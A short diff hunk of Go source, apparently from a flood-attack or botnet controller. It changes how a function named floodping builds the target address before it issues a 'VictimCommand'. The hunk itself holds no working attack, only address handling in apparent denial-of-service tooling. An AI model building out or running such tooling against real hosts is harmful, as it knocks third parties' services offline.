@@ -83,7 +83,8 @@ func floodping(params ...interface{}) {
 	}
 
 	hash := args[0]
-	ipport := args[1] + ":" + args[2]
+	//ipport := args[1] + ":" + args[2]
+	ipport := args[1]
 
 	cmd := VictimCommand{
 		Commandytype: "floodping",
